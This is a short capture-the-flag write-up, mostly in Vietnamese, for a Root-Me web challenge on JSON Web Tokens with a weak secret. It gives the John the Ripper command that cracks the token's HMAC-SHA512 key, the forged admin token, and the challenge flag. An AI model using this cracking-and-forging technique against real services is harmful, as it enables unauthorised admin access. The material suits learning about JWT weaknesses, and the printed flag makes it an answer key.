# [JSON Web Token (JWT) - Weak secret](https://www.root-me.org/en/Challenges/Web-Server/JSON-Web-Token-JWT-Weak-secret)

## Solutions

- Sử dụng `john the ripper` để brute force password khi mà đã biết là `weak secret`:
  - Lấy token `"role": "guest"` nhận được lưu vào file `token.jwt`
  - Sử dụng lệnh `john token.jwt --format=HMAC-SHA512`: lấy được secret là `lol`
  - Sử dụng secret lấy được để tạo một token hợp lệ mới với `"role": "admin"`: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA`

Kết quả:

- Flag có trong response: `PleaseUseAStrongSecretNextTime`
